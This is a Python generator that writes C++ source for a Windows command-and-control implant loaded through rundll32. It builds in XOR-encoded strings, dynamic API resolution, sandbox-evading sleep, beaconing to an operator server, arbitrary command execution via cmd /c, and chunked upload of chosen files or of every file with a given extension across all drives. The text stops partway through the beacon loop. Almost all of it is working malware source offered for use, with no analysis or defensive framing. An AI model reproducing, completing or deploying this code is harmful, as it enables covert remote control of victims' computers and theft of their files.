import random
import string
import sys

XOR_KEY = random.randint(1, 255)

def xor_str(s):
    return bytes([ord(c) ^ XOR_KEY for c in s])

def c_array(b):
    return '{' + ','.join(str(x) for x in b) + '}'

def add_null(s):
    return s + '\x00'

def rand_str(n, prefix=''):
    chars = string.ascii_letters + string.digits
    return prefix + ''.join(random.choice(chars) for _ in range(n))

UA_POOL = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
]

host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
port = sys.argv[2] if len(sys.argv) > 2 else '8443'

# Random runtime names
MUTEX_NAME   = rand_str(16, 'Global\\\\')
LOG_NAME     = rand_str(8) + '.tmp'
USER_AGENT   = random.choice(UA_POOL)
STARTUP_MIN  = random.randint(5, 8)
BEACON_BASE  = random.randint(8, 15)
BEACON_JIT   = random.randint(3, 8)
UPLOAD_BASE  = random.randint(150, 300)
UPLOAD_JIT   = random.randint(100, 400)

strings = {
    'host': add_null(host),
    'port': add_null(port),
    'path_beacon': add_null('/beacon'),
    'path_upload_init': add_null('/upload_init'),
    'path_upload_chunk': add_null('/upload_chunk'),
    'ua': add_null(USER_AGENT),
    'mutexname': add_null(MUTEX_NAME),
    'logname': add_null(LOG_NAME),
    'cmdprefix': add_null('cmd /c '),
    'dll_wininet': add_null('wininet.dll'),
    'dll_advapi32': add_null('advapi32.dll'),
    'dll_shell32': add_null('shell32.dll'),
    'dll_kernel32': add_null('kernel32.dll'),
    'dll_ole32': add_null('ole32.dll'),
    'api_InternetOpenA': add_null('InternetOpenA'),
    'api_InternetConnectA': add_null('InternetConnectA'),
    'api_HttpOpenRequestA': add_null('HttpOpenRequestA'),
    'api_HttpSendRequestA': add_null('HttpSendRequestA'),
    'api_InternetReadFile': add_null('InternetReadFile'),
    'api_InternetCloseHandle': add_null('InternetCloseHandle'),
    'api_InternetSetOptionA': add_null('InternetSetOptionA'),
    'api_RegOpenKeyExA': add_null('RegOpenKeyExA'),
    'api_RegSetValueExA': add_null('RegSetValueExA'),
    'api_RegCloseKey': add_null('RegCloseKey'),
    'api_ShellExecuteA': add_null('ShellExecuteA'),
    'api_CoCreateGuid': add_null('CoCreateGuid'),
    'api_CoInitialize': add_null('CoInitialize'),
    'content_json': add_null('Content-Type: application/json\r\n'),
    'status_ok': add_null('ok'),
    'field_status': add_null('status'),
    'field_offset': add_null('offset'),
    'field_cmd': add_null('cmd'),
    'field_seq': add_null('seq'),
    'field_guid': add_null('guid'),
    'field_filename': add_null('filename'),
    'field_total_size': add_null('total_size'),
    'field_chunk_b64': add_null('chunk_b64'),
    'field_result_b64': add_null('result_b64'),
    'field_hostname': add_null('hostname'),
    'field_username': add_null('username'),
    's_backslash': add_null('\\'),
    's_slash': add_null('/'),
    's_dot': add_null('.'),
    's_dot2': add_null('..'),
    's_dir': add_null('*'),
    'method_post': add_null('POST'),
    's_http': add_null('http://'),
    's_empty': add_null(''),
    's_b64': add_null('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'),
}

arrs = {k: c_array(xor_str(v)) for k, v in strings.items()}

cpp = f'''// Auto-generated DLL agent for rundll32
// XOR key: {XOR_KEY}
// Host: {host}:{port}
// Mutex: {MUTEX_NAME}
// Startup delay: {STARTUP_MIN}s
// Beacon: {BEACON_BASE}s +/- {BEACON_JIT}s
// Upload: {UPLOAD_BASE}ms +/- {UPLOAD_JIT}ms
#include <windows.h>
#include <wininet.h>
#include <string>
#include <cstring>
#include <ctime>
#include <stdio.h>
#include <vector>
#include <stdarg.h>
#include <stdlib.h>

static const unsigned char XOR_KEY = {XOR_KEY};

static unsigned char _e_host[{len(xor_str(strings['host']))}] = {arrs['host']};
static unsigned char _e_port[{len(xor_str(strings['port']))}] = {arrs['port']};
static unsigned char _e_path_beacon[{len(xor_str(strings['path_beacon']))}] = {arrs['path_beacon']};
static unsigned char _e_path_upload_init[{len(xor_str(strings['path_upload_init']))}] = {arrs['path_upload_init']};
static unsigned char _e_path_upload_chunk[{len(xor_str(strings['path_upload_chunk']))}] = {arrs['path_upload_chunk']};
static unsigned char _e_ua[{len(xor_str(strings['ua']))}] = {arrs['ua']};
static unsigned char _e_mutexname[{len(xor_str(strings['mutexname']))}] = {arrs['mutexname']};
static unsigned char _e_logname[{len(xor_str(strings['logname']))}] = {arrs['logname']};
static unsigned char _e_cmdprefix[{len(xor_str(strings['cmdprefix']))}] = {arrs['cmdprefix']};
static unsigned char _e_dll_wininet[{len(xor_str(strings['dll_wininet']))}] = {arrs['dll_wininet']};
static unsigned char _e_dll_advapi32[{len(xor_str(strings['dll_advapi32']))}] = {arrs['dll_advapi32']};
static unsigned char _e_dll_shell32[{len(xor_str(strings['dll_shell32']))}] = {arrs['dll_shell32']};
static unsigned char _e_dll_kernel32[{len(xor_str(strings['dll_kernel32']))}] = {arrs['dll_kernel32']};
static unsigned char _e_dll_ole32[{len(xor_str(strings['dll_ole32']))}] = {arrs['dll_ole32']};
static unsigned char _e_api_InternetOpenA[{len(xor_str(strings['api_InternetOpenA']))}] = {arrs['api_InternetOpenA']};
static unsigned char _e_api_InternetConnectA[{len(xor_str(strings['api_InternetConnectA']))}] = {arrs['api_InternetConnectA']};
static unsigned char _e_api_HttpOpenRequestA[{len(xor_str(strings['api_HttpOpenRequestA']))}] = {arrs['api_HttpOpenRequestA']};
static unsigned char _e_api_HttpSendRequestA[{len(xor_str(strings['api_HttpSendRequestA']))}] = {arrs['api_HttpSendRequestA']};
static unsigned char _e_api_InternetReadFile[{len(xor_str(strings['api_InternetReadFile']))}] = {arrs['api_InternetReadFile']};
static unsigned char _e_api_InternetCloseHandle[{len(xor_str(strings['api_InternetCloseHandle']))}] = {arrs['api_InternetCloseHandle']};
static unsigned char _e_api_InternetSetOptionA[{len(xor_str(strings['api_InternetSetOptionA']))}] = {arrs['api_InternetSetOptionA']};
static unsigned char _e_api_RegOpenKeyExA[{len(xor_str(strings['api_RegOpenKeyExA']))}] = {arrs['api_RegOpenKeyExA']};
static unsigned char _e_api_RegSetValueExA[{len(xor_str(strings['api_RegSetValueExA']))}] = {arrs['api_RegSetValueExA']};
static unsigned char _e_api_RegCloseKey[{len(xor_str(strings['api_RegCloseKey']))}] = {arrs['api_RegCloseKey']};
static unsigned char _e_api_ShellExecuteA[{len(xor_str(strings['api_ShellExecuteA']))}] = {arrs['api_ShellExecuteA']};
static unsigned char _e_api_CoCreateGuid[{len(xor_str(strings['api_CoCreateGuid']))}] = {arrs['api_CoCreateGuid']};
static unsigned char _e_api_CoInitialize[{len(xor_str(strings['api_CoInitialize']))}] = {arrs['api_CoInitialize']};
static unsigned char _e_content_json[{len(xor_str(strings['content_json']))}] = {arrs['content_json']};
static unsigned char _e_status_ok[{len(xor_str(strings['status_ok']))}] = {arrs['status_ok']};
static unsigned char _e_field_status[{len(xor_str(strings['field_status']))}] = {arrs['field_status']};
static unsigned char _e_field_offset[{len(xor_str(strings['field_offset']))}] = {arrs['field_offset']};
static unsigned char _e_field_cmd[{len(xor_str(strings['field_cmd']))}] = {arrs['field_cmd']};
static unsigned char _e_field_seq[{len(xor_str(strings['field_seq']))}] = {arrs['field_seq']};
static unsigned char _e_field_guid[{len(xor_str(strings['field_guid']))}] = {arrs['field_guid']};
static unsigned char _e_field_filename[{len(xor_str(strings['field_filename']))}] = {arrs['field_filename']};
static unsigned char _e_field_total_size[{len(xor_str(strings['field_total_size']))}] = {arrs['field_total_size']};
static unsigned char _e_field_chunk_b64[{len(xor_str(strings['field_chunk_b64']))}] = {arrs['field_chunk_b64']};
static unsigned char _e_field_result_b64[{len(xor_str(strings['field_result_b64']))}] = {arrs['field_result_b64']};
static unsigned char _e_field_hostname[{len(xor_str(strings['field_hostname']))}] = {arrs['field_hostname']};
static unsigned char _e_field_username[{len(xor_str(strings['field_username']))}] = {arrs['field_username']};
static unsigned char _e_s_backslash[{len(xor_str(strings['s_backslash']))}] = {arrs['s_backslash']};
static unsigned char _e_s_slash[{len(xor_str(strings['s_slash']))}] = {arrs['s_slash']};
static unsigned char _e_s_dot[{len(xor_str(strings['s_dot']))}] = {arrs['s_dot']};
static unsigned char _e_s_dot2[{len(xor_str(strings['s_dot2']))}] = {arrs['s_dot2']};
static unsigned char _e_s_dir[{len(xor_str(strings['s_dir']))}] = {arrs['s_dir']};
static unsigned char _e_method_post[{len(xor_str(strings['method_post']))}] = {arrs['method_post']};
static unsigned char _e_s_http[{len(xor_str(strings['s_http']))}] = {arrs['s_http']};
static unsigned char _e_s_empty[{len(xor_str(strings['s_empty']))}] = {arrs['s_empty']};
static unsigned char _e_s_b64[{len(xor_str(strings['s_b64']))}] = {arrs['s_b64']};

static void s_copy(char* dst, unsigned char* src, size_t n) {{
    for(size_t i = 0; i < n; i++) dst[i] = src[i] ^ XOR_KEY;
    dst[n-1] = '\\0';
}}

typedef HINTERNET (WINAPI *t_InternetOpenA)(LPCSTR,DWORD,LPCSTR,LPCSTR,DWORD);
typedef HINTERNET (WINAPI *t_InternetConnectA)(HINTERNET,LPCSTR,INTERNET_PORT,LPCSTR,LPCSTR,DWORD,DWORD,DWORD_PTR);
typedef HINTERNET (WINAPI *t_HttpOpenRequestA)(HINTERNET,LPCSTR,LPCSTR,LPCSTR,LPCSTR,LPCSTR*,DWORD,DWORD_PTR);
typedef BOOL (WINAPI *t_HttpSendRequestA)(HINTERNET,LPCSTR,DWORD,LPVOID,DWORD);
typedef BOOL (WINAPI *t_InternetReadFile)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL (WINAPI *t_InternetCloseHandle)(HINTERNET);
typedef BOOL (WINAPI *t_InternetSetOptionA)(HINTERNET,DWORD,LPVOID,DWORD);
typedef LONG (WINAPI *t_RegOpenKeyExA)(HKEY,LPCSTR,DWORD,REGSAM,PHKEY);
typedef LONG (WINAPI *t_RegSetValueExA)(HKEY,LPCSTR,DWORD,DWORD,const BYTE*,DWORD);
typedef LONG (WINAPI *t_RegCloseKey)(HKEY);
typedef HINSTANCE (WINAPI *t_ShellExecuteA)(HWND,LPCSTR,LPCSTR,LPCSTR,LPCSTR,INT);
typedef HRESULT (WINAPI *t_CoCreateGuid)(GUID*);
typedef HRESULT (WINAPI *t_CoInitialize)(LPVOID);

static struct {{
    t_InternetOpenA f_InternetOpenA;
    t_InternetConnectA f_InternetConnectA;
    t_HttpOpenRequestA f_HttpOpenRequestA;
    t_HttpSendRequestA f_HttpSendRequestA;
    t_InternetReadFile f_InternetReadFile;
    t_InternetCloseHandle f_InternetCloseHandle;
    t_InternetSetOptionA f_InternetSetOptionA;
    t_RegOpenKeyExA f_RegOpenKeyExA;
    t_RegSetValueExA f_RegSetValueExA;
    t_RegCloseKey f_RegCloseKey;
    t_ShellExecuteA f_ShellExecuteA;
    t_CoCreateGuid f_CoCreateGuid;
    t_CoInitialize f_CoInitialize;
}} _api;

static FARPROC _gpa(HMODULE h, const char* name) {{
    return GetProcAddress(h, name);
}}

static bool _resolve_apis() {{
    char dn1[32]; s_copy(dn1, _e_dll_wininet, sizeof(_e_dll_wininet));
    char dn2[32]; s_copy(dn2, _e_dll_advapi32, sizeof(_e_dll_advapi32));
    char dn3[32]; s_copy(dn3, _e_dll_shell32, sizeof(_e_dll_shell32));
    char dn4[32]; s_copy(dn4, _e_dll_ole32, sizeof(_e_dll_ole32));
    HMODULE h1 = LoadLibraryA(dn1);
    HMODULE h2 = LoadLibraryA(dn2);
    HMODULE h3 = LoadLibraryA(dn3);
    HMODULE h4 = LoadLibraryA(dn4);
    if(!h1 || !h2 || !h3 || !h4) return false;
    char n1[32]; s_copy(n1, _e_api_InternetOpenA, sizeof(_e_api_InternetOpenA));
    char n2[32]; s_copy(n2, _e_api_InternetConnectA, sizeof(_e_api_InternetConnectA));
    char n3[32]; s_copy(n3, _e_api_HttpOpenRequestA, sizeof(_e_api_HttpOpenRequestA));
    char n4[32]; s_copy(n4, _e_api_HttpSendRequestA, sizeof(_e_api_HttpSendRequestA));
    char n5[32]; s_copy(n5, _e_api_InternetReadFile, sizeof(_e_api_InternetReadFile));
    char n6[32]; s_copy(n6, _e_api_InternetCloseHandle, sizeof(_e_api_InternetCloseHandle));
    char n7[32]; s_copy(n7, _e_api_InternetSetOptionA, sizeof(_e_api_InternetSetOptionA));
    char n8[32]; s_copy(n8, _e_api_RegOpenKeyExA, sizeof(_e_api_RegOpenKeyExA));
    char n9[32]; s_copy(n9, _e_api_RegSetValueExA, sizeof(_e_api_RegSetValueExA));
    char n10[32]; s_copy(n10, _e_api_RegCloseKey, sizeof(_e_api_RegCloseKey));
    char n11[32]; s_copy(n11, _e_api_ShellExecuteA, sizeof(_e_api_ShellExecuteA));
    char n12[32]; s_copy(n12, _e_api_CoCreateGuid, sizeof(_e_api_CoCreateGuid));
    char n13[32]; s_copy(n13, _e_api_CoInitialize, sizeof(_e_api_CoInitialize));
    _api.f_InternetOpenA = (t_InternetOpenA)_gpa(h1, n1);
    _api.f_InternetConnectA = (t_InternetConnectA)_gpa(h1, n2);
    _api.f_HttpOpenRequestA = (t_HttpOpenRequestA)_gpa(h1, n3);
    _api.f_HttpSendRequestA = (t_HttpSendRequestA)_gpa(h1, n4);
    _api.f_InternetReadFile = (t_InternetReadFile)_gpa(h1, n5);
    _api.f_InternetCloseHandle = (t_InternetCloseHandle)_gpa(h1, n6);
    _api.f_InternetSetOptionA = (t_InternetSetOptionA)_gpa(h1, n7);
    _api.f_RegOpenKeyExA = (t_RegOpenKeyExA)_gpa(h2, n8);
    _api.f_RegSetValueExA = (t_RegSetValueExA)_gpa(h2, n9);
    _api.f_RegCloseKey = (t_RegCloseKey)_gpa(h2, n10);
    _api.f_ShellExecuteA = (t_ShellExecuteA)_gpa(h3, n11);
    _api.f_CoCreateGuid = (t_CoCreateGuid)_gpa(h4, n12);
    _api.f_CoInitialize = (t_CoInitialize)_gpa(h4, n13);
    return _api.f_InternetOpenA && _api.f_InternetConnectA;
}}

static std::string base64_encode(const std::string& in) {{
    static const char* b64 = NULL;
    if(!b64) {{ char t[65]; s_copy(t, _e_s_b64, sizeof(_e_s_b64)); b64 = _strdup(t); }}
    std::string out;
    int val = 0, valb = -6;
    for(unsigned char c : in) {{
        val = (val << 8) + c; valb += 8;
        while(valb >= 0) {{ out.push_back(b64[(val >> valb) & 0x3F]); valb -= 6; }}
    }}
    if(valb > -6) out.push_back(b64[((val << 8) >> (valb + 8)) & 0x3F]);
    while(out.size() % 4) out.push_back('=');
    return out;
}}

static char* _json_field(const char* json, const char* key) {{
    static char buf[4096];
    std::string j(json);
    std::string k(1, (char)34);
    k += key;
    k += (char)34;
    size_t pos = j.find(k);
    if(pos == std::string::npos) return NULL;
    size_t start = pos + k.length();
    if(start < j.length() && j[start] == (char)34) start++;
    while(start < j.length() && (j[start] == ' ' || j[start] == ':')) start++;
    if(start >= j.length() || j[start] != (char)34) return NULL;
    start++;
    size_t i = 0;
    while(start < j.length() && j[start] != (char)34 && i < sizeof(buf)-1) {{ buf[i++] = j[start++]; }}
    buf[i] = 0; return buf;
}}

static std::string _exec(const std::string& cmd) {{
    char prefix[16]; s_copy(prefix, _e_cmdprefix, sizeof(_e_cmdprefix));
    std::string full = std::string(prefix) + cmd;
    SECURITY_ATTRIBUTES sa = {{sizeof(sa), NULL, TRUE}};
    HANDLE hRead, hWrite;
    CreatePipe(&hRead, &hWrite, &sa, 0);
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
    STARTUPINFOA si = {{0}}; si.cb = sizeof(si); si.dwFlags = STARTF_USESTDHANDLES; si.hStdOutput = hWrite; si.hStdError = hWrite;
    PROCESS_INFORMATION pi = {{0}};
    BOOL ok = CreateProcessA(NULL, (LPSTR)full.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(hWrite);
    std::string out;
    if(ok) {{
        char buf[4096]; DWORD r;
        while(ReadFile(hRead, buf, sizeof(buf)-1, &r, NULL) && r > 0) {{ buf[r] = '\\0'; out += buf; }}
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }}
    CloseHandle(hRead);
    return out;
}}

static std::string _http_json(const char* host, const char* path, const std::string& body) {{
    char ua[256]; s_copy(ua, _e_ua, sizeof(_e_ua));
    char method[8]; s_copy(method, _e_method_post, sizeof(_e_method_post));
    HINTERNET hInet = _api.f_InternetOpenA(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if(!hInet) return "";
    INTERNET_PORT port = INTERNET_DEFAULT_HTTP_PORT;
    char port_str[16]; s_copy(port_str, _e_port, sizeof(_e_port));
    int custom_port = atoi(port_str);
    if(custom_port > 0 && custom_port < 65536) port = custom_port;
    HINTERNET hConn = _api.f_InternetConnectA(hInet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if(!hConn) {{ _api.f_InternetCloseHandle(hInet); return ""; }}
    const char* accept[] = {{"*/*", NULL}};
    HINTERNET hReq = _api.f_HttpOpenRequestA(hConn, method, path, NULL, NULL, accept, 0, 0);
    if(!hReq) {{ _api.f_InternetCloseHandle(hConn); _api.f_InternetCloseHandle(hInet); return ""; }}
    DWORD to = 15000;
    _api.f_InternetSetOptionA(hReq, INTERNET_OPTION_SEND_TIMEOUT, &to, sizeof(to));
    _api.f_InternetSetOptionA(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &to, sizeof(to));
    char ct[64]; s_copy(ct, _e_content_json, sizeof(_e_content_json));
    BOOL sent = _api.f_HttpSendRequestA(hReq, ct, strlen(ct), (LPVOID)body.c_str(), body.length());
    std::string resp;
    if(sent) {{
        char buf[8192]; DWORD r;
        while(_api.f_InternetReadFile(hReq, buf, sizeof(buf)-1, &r) && r > 0) {{ buf[r] = '\\0'; resp += buf; }}
    }}
    _api.f_InternetCloseHandle(hReq);
    _api.f_InternetCloseHandle(hConn);
    _api.f_InternetCloseHandle(hInet);
    return resp;
}}

static std::string _g2s(const GUID& g) {{
    char buf[40];
    snprintf(buf, sizeof(buf), "%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X",
        g.Data1, g.Data2, g.Data3,
        g.Data4[0], g.Data4[1], g.Data4[2], g.Data4[3],
        g.Data4[4], g.Data4[5], g.Data4[6], g.Data4[7]);
    return std::string(buf);
}}

static void _log(const char* fmt, ...) {{
    char path[MAX_PATH];
    GetTempPathA(sizeof(path), path);
    char ln[32]; s_copy(ln, _e_logname, sizeof(_e_logname));
    strcat(path, ln);
    FILE* f = fopen(path, "a");
    if(!f) return;
    time_t t = time(NULL); struct tm* tm = localtime(&t);
    fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d] ", tm->tm_year+1900, tm->tm_mon+1, tm->tm_mday, tm->tm_hour, tm->tm_min, tm->tm_sec);
    va_list args; va_start(args, fmt); vfprintf(f, fmt, args); va_end(args);
    fprintf(f, "\\n"); fclose(f);
}}

// Sleep obfuscation: busy-loop + jitter to defeat sandbox time-acceleration
static void _sleep_obf(int ms) {{
    if(ms <= 0) return;
    LARGE_INTEGER freq, start, now;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    double target = (double)ms / 1000.0 * (double)freq.QuadPart;
    // Add 5-15% jitter in busy loop
    target *= (1.0 + ((rand() % 1000) / 10000.0));
    while(true) {{
        QueryPerformanceCounter(&now);
        if((double)(now.QuadPart - start.QuadPart) >= target) break;
        // Mix in some useless computation to keep CPU warm
        volatile int x = 0;
        for(int i = 0; i < 1000; i++) x += i * (i % 7);
        Sleep(1);
    }}
}}

static const size_t CHUNK_SIZE = 512 * 1024;

struct _uj {{ std::string filepath, guid, hostname, username; }};

static void _up(_uj* job) {{
    _log("upload thread started for %s", job->filepath.c_str());
    HANDLE hFile = CreateFileA(job->filepath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {{ _log("upload: cannot open %s", job->filepath.c_str()); return; }}
    LARGE_INTEGER fs; GetFileSizeEx(hFile, &fs);
    LONGLONG total = fs.QuadPart;
    size_t bn_pos = job->filepath.find_last_of("/\\\\");
    std::string basename = (bn_pos != std::string::npos) ? job->filepath.substr(bn_pos + 1) : job->filepath;
    char sbn[256]; s_copy(sbn, _e_s_empty, sizeof(_e_s_empty)); strncat(sbn, basename.c_str(), sizeof(sbn)-1);
    char host[256]; s_copy(host, _e_host, sizeof(_e_host));
    char fcg[32]; s_copy(fcg, _e_field_guid, sizeof(_e_field_guid));
    char fcf[32]; s_copy(fcf, _e_field_filename, sizeof(_e_field_filename));
    char fct[32]; s_copy(fct, _e_field_total_size, sizeof(_e_field_total_size));
    char pui[64]; s_copy(pui, _e_path_upload_init, sizeof(_e_path_upload_init));
    char puc[64]; s_copy(puc, _e_path_upload_chunk, sizeof(_e_path_upload_chunk));
    std::string init_body = "{{\\\"" + std::string(fcg) + "\\\":\\\"" + job->guid + "\\\",\\\"" + std::string(fcf) + "\\\":\\\"" + sbn + "\\\",\\\"" + std::string(fct) + "\\\":" + std::to_string(total) + "}}";
    _log("upload init_body: %s", init_body.c_str());
    std::string resp = _http_json(host, pui, init_body);
    _log("upload init resp: %s", resp.c_str());
    bool inited = false;
    LONGLONG offset = 0;
    if(!resp.empty()) {{
        char* st = _json_field(resp.c_str(), "status");
        char sok[8]; s_copy(sok, _e_status_ok, sizeof(_e_status_ok));
        if(st && strcmp(st, sok) == 0) {{
            inited = true;
            char* off_str = _json_field(resp.c_str(), "offset");
            if(off_str) offset = strtoll(off_str, NULL, 10);
        }}
    }}
    if(!inited) {{ CloseHandle(hFile); _log("upload: init failed"); return; }}
    if(offset > 0) {{
        LARGE_INTEGER off; off.QuadPart = offset;
        if(!SetFilePointerEx(hFile, off, NULL, FILE_BEGIN)) {{
            _log("upload: seek failed"); CloseHandle(hFile); return;
        }}
        _log("upload: resuming from offset %lld", offset);
    }}
    _log("upload: started %s (%lld bytes)", sbn, total);
    int retry_count = 0;
    while(offset < total) {{
        DWORD to_read = (total - offset > (LONGLONG)CHUNK_SIZE) ? CHUNK_SIZE : (DWORD)(total - offset);
        std::vector<BYTE> buf(to_read);
        DWORD read = 0;
        if(!ReadFile(hFile, buf.data(), to_read, &read, NULL) || read == 0) break;
        std::string chunk_b64 = base64_encode(std::string((char*)buf.data(), read));
        char fco[32]; s_copy(fco, _e_field_offset, sizeof(_e_field_offset));
        char fcc[32]; s_copy(fcc, _e_field_chunk_b64, sizeof(_e_field_chunk_b64));
        std::string body = "{{\\\"" + std::string(fcg) + "\\\":\\\"" + job->guid + "\\\",\\\"" + std::string(fcf) + "\\\":\\\"" + sbn + "\\\",\\\"" + std::string(fco) + "\\\":" + std::to_string(offset) + ",\\\"" + std::string(fcc) + "\\\":\\\"" + chunk_b64 + "\\\"}}";
        resp = _http_json(host, puc, body);
        _log("upload chunk resp: %s", resp.c_str());
        bool ok = false;
        if(!resp.empty()) {{
            char* st = _json_field(resp.c_str(), "status");
            char sok[8]; s_copy(sok, _e_status_ok, sizeof(_e_status_ok));
            if(st && strcmp(st, sok) == 0) ok = true;
        }}
        if(ok) {{
            offset += read; retry_count = 0;
        }} else {{
            retry_count++;
            int sleep_ms = 5000;
            if(retry_count > 5) sleep_ms = 10000;
            if(retry_count > 10) sleep_ms = 30000;
            if(retry_count > 20) sleep_ms = 60000;
            if(retry_count > 30) sleep_ms = 300000;
            _sleep_obf(sleep_ms); continue;
        }}
        _sleep_obf({UPLOAD_BASE} + (rand() % {UPLOAD_JIT}));
    }}
    CloseHandle(hFile);
}}

static bool _he(const std::string& path, const std::string& ext) {{
    size_t p = path.find_last_of('.');
    if(p == std::string::npos) return false;
    std::string e = path.substr(p + 1);
    if(e.length() != ext.length()) return false;
    return _stricmp(e.c_str(), ext.c_str()) == 0;
}}

static void _sd(const std::string& dir, const std::string& ext, std::vector<std::string>& out) {{
    std::string pat = dir;
    char bs[4]; s_copy(bs, _e_s_backslash, sizeof(_e_s_backslash));
    char sl[4]; s_copy(sl, _e_s_slash, sizeof(_e_s_slash));
    if(!pat.empty() && pat.back() != bs[0] && pat.back() != sl[0]) pat += bs[0];
    char sstar[4]; s_copy(sstar, _e_s_dir, sizeof(_e_s_dir));
    pat += sstar;
    WIN32_FIND_DATAA fd; HANDLE hFind = FindFirstFileA(pat.c_str(), &fd);
    if(hFind == INVALID_HANDLE_VALUE) return;
    do {{
        std::string name = fd.cFileName;
        char d1[4]; s_copy(d1, _e_s_dot, sizeof(_e_s_dot));
        char d2[4]; s_copy(d2, _e_s_dot2, sizeof(_e_s_dot2));
        if(name == d1 || name == d2) continue;
        if(fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
        std::string full = dir;
        if(!full.empty() && full.back() != bs[0] && full.back() != sl[0]) full += bs[0];
        full += name;
        if(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {{
            _sd(full, ext, out);
        }} else {{
            if(_he(full, ext)) out.push_back(full);
        }}
    }} while(FindNextFileA(hFind, &fd));
    FindClose(hFind);
}}

static std::vector<std::string> _ff(const std::string& ext) {{
    std::vector<std::string> out;
    char drives[256]; DWORD len = GetLogicalDriveStringsA(sizeof(drives), drives);
    if(len == 0 || len > sizeof(drives)) return out;
    for(char* p = drives; *p; p += strlen(p) + 1) {{
        UINT t = GetDriveTypeA(p);
        if(t == DRIVE_FIXED || t == DRIVE_REMOTE || t == DRIVE_REMOVABLE) {{
            _sd(std::string(p), ext, out);
        }}
    }}
    return out;
}}

DWORD WINAPI _ut(LPVOID param) {{
    _uj* job = (_uj*)param; if(!job) return 0;
    _up(job); delete job; return 0;
}}

struct _uej {{ std::string ext, guid, hostname, username; }};

DWORD WINAPI _uet(LPVOID param) {{
    _uej* job = (_uej*)param; if(!job) return 0;
    std::string ext = job->ext;
    if(!ext.empty() && ext[0] == '.') ext = ext.substr(1);
    std::vector<std::string> files = _ff(ext);
    for(const std::string& fp : files) {{
        _uj* uj = new _uj();
        uj->filepath = fp;
        GUID g; _api.f_CoCreateGuid(&g);
        uj->guid = _g2s(g);
        uj->hostname = job->hostname;
        uj->username = job->username;
        _up(uj);
        delete uj;
    }}
    delete job;
    return 0;
}}

DWORD WINAPI _bl(LPVOID) {{
    char host[256]; s_copy(host, _e_host, sizeof(_e_host));
    char path[256]; s_copy(path, _e_path_beacon, sizeof(_e_path_beacon));
    char hostname[128], username[128], guid[40];
    DWORD hlen = sizeof(hostname), ulen = sizeof(username);
    GetComputerNameA(hostname, &hlen);
    GetUserNameA(username, &ulen);
    GUID g; _api.f_CoCreateGuid(&g);
    snprintf(guid, sizeof(guid), "%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X",
        g.Data1, g.Data2, g.Data3,
        g.Data4[0], g.Data4[1], g.Data4[2], g.Data4[3],
        g.Data4[4], g.Data4[5], g.Data4[6], g.Data4[7]);
    int last_seq = 0;
    int fail_count = 0;
    const int MAX_BACKOFF_SEC = 120;
    while(true) {{
        char fguid[32], fh[32], fu[32], fr[32], fs[32];
        s_copy(fguid, _e_field_guid, sizeof(_e_field_guid));
        s_copy(fh, _e_field_hostname, sizeof(_e_field_hostname));
        s_copy(fu, _e_field_username, sizeof(_e_field_username));
        s_copy(fr, _e_field_result_b64, sizeof(_e_field_result_b64));
        s_copy(fs, _e_field_seq, sizeof(_e_field_seq));
        std::string json = "{{\\"" + std::string(fguid) + "\\":\\"" + std::string(guid) + "\\",\\"" + std::string(fh) + "\\":\\"" + std::string(hostname) + "\\",\\"" + std::string(fu) + "\\":\\"" + std::string(username) + "\\",\\"" + std::string(fr) + "\\":\\"\\",\\"" + std::string(fs) + "\\":\\"" + std::to_string(last_seq) + "\\"}}";
        std::string resp = _http_json(host, path, json);
        if(!resp.empty()) {{
            fail_count = 0;
            char* cmd_raw = _json_field(resp.c_str(), "cmd");
            std::string cmd = cmd_raw ? cmd_raw : "";
            char* seq_raw = _json_field(resp.c_str(), "seq");
            int cmd_seq = seq_raw ? atoi(seq_raw) : 0;
            if(!cmd.empty() && cmd_seq > last_seq) {{
                last_seq = cmd_seq;
                if(_stricmp(cmd.c_str(), "exit") == 0) return 0;
                std::string out;
                if(_strnicmp(cmd.c_str(), "upload ", 7) == 0) {{
                    _uj* job = new _uj();
                    job->filepath = cmd.substr(7);
                    while(!job->filepath.empty() && (job->filepath.back() == ' ' || job->filepath.back() == '\\t'))
                        job->filepath.pop_back();
                    job->guid = guid; job->hostname = hostname; job->username = username;
                    CreateThread(NULL, 0, _ut, job, 0, NULL);
                    out = "started";
                }} else if(_strnicmp(cmd.c_str(), "upload_ext ", 11) == 0) {{
                    _uej* job = new _uej();
                    job->ext = cmd.substr(11);
                    while(!job->ext.empty() && (job->ext.back() == ' ' || job->ext.back() == '\\t'))
                        job->ext.pop_back();
                    job->guid = guid; job->hostname = hostname; job->username = username;
                    CreateThread(NULL, 0, _uet, job, 0, NULL);
                    out = "scanning";
                }} else {{
                    out = _exec(cmd);
                }}
                std::string out_b64 = base64_encode(out);
